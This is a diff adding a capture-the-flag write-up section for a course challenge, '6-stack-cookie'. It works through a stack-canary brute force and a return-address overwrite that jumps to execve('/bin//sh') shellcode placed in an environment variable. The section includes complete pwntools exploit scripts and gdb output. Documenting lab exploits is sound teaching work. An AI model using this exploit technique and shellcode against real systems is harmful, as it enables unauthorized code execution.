@@ -430,6 +430,216 @@ $ cat flag
 CS6332{y0u_mAy_ne3d_n0t_m0rE_tHaN_3_bytEs}
 ```
 
+## 6-stack-cookie
+
+The problem statement is below.
+
+```md
+Please break GCC ProPolice. I know beavers knew how to crack this.
+```
+
+First, execute `checksec`. Now, we know the program has a canary and doesn't use PIE.
+
+``` bash
+TXK220008@ctf-vm1:~/unit2/6-stack-cookie$ checksec 6-stack-cookie 
+[*] '/home/TXK220008/unit2/6-stack-cookie/6-stack-cookie'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+```
+
+To get the canary address from the buffer, do the brute force.
+
+Executing the code below, we know that the distance is 128 bytes. The 129th byte after the buffer is the start of the canary.
+
+```python
+#!/usr/bin/env python3
+import struct
+
+from pwn import *
+from pwn import asm, context, gdb, p8, p16, p32, process
+
+context.terminal = ["tmux", "splitw", "-h"]
+context.log_level = "DEBUG"
+
+payload = asm(
+    """
+    xor eax, eax
+"""
+)
+p = process(["./6-stack-cookie"])
+# p = process(["6-stack-cookie"])
+
+i = 1
+while True:
+    p.recvline()  # you have XX trials left
+    p.recvline()  # how many bytes?
+
+    p.sendline(f"{i}".encode())
+
+    p.recvline()  # reading X bytes
+
+    p.sendline(b"A" * i)
+
+    p.recvline()  # Hello YYYY!
+    rec = p.recvline()  # Exit Status 0
+
+    if rec != b"Exit status: 0\n":
+        print(rec)
+        print(f"[-] Failed with {i} bytes")
+        exit(1)
+    print(f"[+] Success with {i} bytes")
+    i += 1
+
+p.close()
+
+```
+
+```bash
+[DEBUG] Received 0x3d bytes:
+    b'*** stack smashing detected ***: ./6-stack-cookie terminated\n'
+b'*** stack smashing detected ***: ./6-stack-cookie terminated\n'
+[-] Failed with 129 bytes
+[*] Stopped process './6-stack-cookie' (pid 24423)
+```
+
+This is the code to get the randomly generated string.
+
+```python
+canary = []
+guess = 0
+while len(canary) < 4:
+    print("TRIALS", p.recvline())  # reaming trials
+    print("HOW", p.recvline())  # how many bytes?
+    p.sendline(f"{128 + len(canary) + 1}".encode())
+    print("READING", p.recvline())  # reading
+    payload = b"A" * 128 + bytes(canary + [guess])
+    p.sendline(payload)
+    print("HELLO", p.recvline())  # hello
+    # if guess == 10:
+    #     print("NEWLINE", p.recvline())
+    resp = p.recvline()  # stack smashing or exit
+    print("STACK|EXIT", resp)
+    if "stack" in resp.decode():
+        guess += 1
+        resp = p.recvline()  # exit status
+        print("EXIT", resp)
+    if "0" in resp.decode():
+        print("Found byte: " + hex(guess))
+        canary.append(guess)
+        guess = 0
+    print("GUESS", guess, canary)
+```
+
+The start of string buffer is `0xffffd15c`.
+
+```gdb
+ ► 0x8048658 <input_func+101>    calll  read@plt <read@plt>
+        fd: 0x0
+        buf: 0xffffd15c —▸ 0xffffd1ec —▸ 0x80486db (non_main_func+76) ◂— 0x8310c483
+        nbytes: 0x64
+```
+
+The return address of `input_func` is `0xffffd1ec`.
+
+```gdb
+pwndbg> info frame
+Stack level 0, frame at 0xffffd1f0:
+ eip = 0x804867c in input_func; saved eip = 0x80486db
+ called by frame at 0xffffd220
+ Arglist at 0xffffd1e8, args: 
+ Locals at 0xffffd1e8, Previous frame's sp is 0xffffd1f0
+ Saved registers:
+  ebp at 0xffffd1e8, eip at 0xffffd1ec
+```
+
+We can embed shellcode into environment variable. And, return to the top of it.
+
+The fianl code is like this.
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+from pwn import asm, context, gdb, log, p8, p16, p32, process
+
+context.terminal = ["tmux", "splitw", "-h"]
+# context.log_level = "DEBUG"
+
+shellcode = asm(
+    """
+xor     eax, eax
+add     eax, 0x32
+int     0x80
+mov     ebx, eax
+mov     ecx, eax
+xor     eax, eax
+add     eax, 0x47
+int     0x80
+xor     eax, eax
+add     eax, 0x0b
+push    edx
+push    0x68732f6e
+push    0x69622f2f
+mov     ebx, esp
+xor     ecx, ecx
+xor     edx, edx
+int     0x80
+"""
+)
+
+# p = gdb.debug(["./6-stack-cookie"], env={"SHELLCODE": shellcode})
+p = process(["./6-stack-cookie"], env={"SHELLCODE": shellcode})
+canary = []
+guess = 0
+while len(canary) < 4:
+    print("TRIALS", p.recvline())  # reaming trials
+    print("HOW", p.recvline())  # how many bytes?
+    p.sendline(f"{128 + len(canary) + 1}".encode())
+    print("READING", p.recvline())  # reading
+    payload = b"A" * 128 + bytes(canary + [guess])
+    p.sendline(payload)
+    print("HELLO", p.recvline())  # hello
+    # if guess == 10:
+    #     print("NEWLINE", p.recvline())
+    resp = p.recvline()  # stack smashing or exit
+    print("STACK|EXIT", resp)
+    if "stack" in resp.decode():
+        guess += 1
+        resp = p.recvline()  # exit status
+        print("EXIT", resp)
+    if "0" in resp.decode():
+        print("Found byte: " + hex(guess))
+        canary.append(guess)
+        guess = 0
+    print("GUESS", guess, canary)
+
+print("========================================")
+print("You've got", bytes(canary))
+system_addr = p32(0xF7E3ADB0)
+shellcode_addr = p32(0xFFFFDFBC)
+print(system_addr, len(system_addr))
+p.recvline()
+p.recvline()
+payload = (
+    b"A" * 128
+    + bytes(canary)
+    + b"A" * (144 - 128 - len(canary))
+    + shellcode_addr
+)
+p.sendline(f"{len(payload)}".encode())
+p.sendline(payload)
+p.interactive()
+```
+
+You get the flag like below when executing the above Python script.
+
+```bash
+$ cat flag
+CS6332{0ne_by_1}
+```
 
 ## 7-dep-0
 
